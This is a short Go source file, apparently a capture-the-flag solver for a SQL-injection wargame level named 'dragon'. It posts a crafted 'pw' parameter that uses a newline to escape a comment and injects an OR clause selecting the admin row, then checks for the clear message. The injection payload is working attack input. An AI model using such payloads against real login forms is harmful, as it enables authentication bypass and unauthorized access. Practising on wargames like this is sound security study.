package problem

import(
	"fmt"
	"strings"
)

func Dragon(session string){
	file := "dragon_c1577dc8b003a4f163cab14e8d92510b.php"
	
	param := map[string]string{
		"pw" : "%0d%0a or id='admin' limit 1,1%23",
	}
	
	contents := connect(file, param, session)
	if strings.Contains(string(contents),"DRAGON Clear!"){
		fmt.Println("DRAGON Clear!")
	}
}